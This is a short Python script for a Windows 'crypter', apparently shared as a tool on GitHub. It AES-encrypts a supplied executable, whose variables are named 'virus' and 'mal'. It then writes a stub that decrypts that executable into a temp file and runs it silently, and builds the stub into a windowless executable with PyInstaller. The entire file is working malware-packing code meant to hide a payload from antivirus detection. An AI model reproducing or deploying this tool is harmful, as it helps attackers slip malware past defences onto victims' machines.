from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import base64
import sys
import os

print("\n[!] Note: this crypter only works on computers running Windows!")
print("[!] Creator's GitHub: https://github.com/Gusbtc/\n")

KEY = get_random_bytes(16)
random = get_random_bytes(16)
cipher = AES.new(KEY, AES.MODE_CBC, random)

if len(sys.argv) < 2:
    print(f"[x] Usage: python {sys.argv[0]} file.exe")
    sys.exit(1)

executavel = sys.argv[1]

try:
    with open(executavel, "rb") as virus:
        mal = virus.read()
    criptografado = cipher.encrypt(pad(mal, AES.block_size))
    criptob64 = base64.b64encode(criptografado).decode()
except:
    print('[x] File not found')
    quit()

stub = f"""from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import tempfile
import subprocess

KEY = base64.b64decode('{base64.b64encode(KEY).decode()}')
random = base64.b64decode('{base64.b64encode(random).decode()}')
cripto = base64.b64decode('{criptob64}')

cipher = AES.new(KEY, AES.MODE_CBC, random)
descripto = unpad(cipher.decrypt(cripto), AES.block_size)

with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as f:
    f.write(descripto)
    cam = f.name
subprocess.Popen(cam, shell=True)
"""

with open('stub.py', "w") as resultado:
    resultado.write(stub)

print("[+] stub.py successfully generated!")
print("[+] Generating the final executable...")
os.system(f'pyinstaller -F -w --clean stub.py >nul 2>&1')
print('[+] Check out the "dist" directory :)')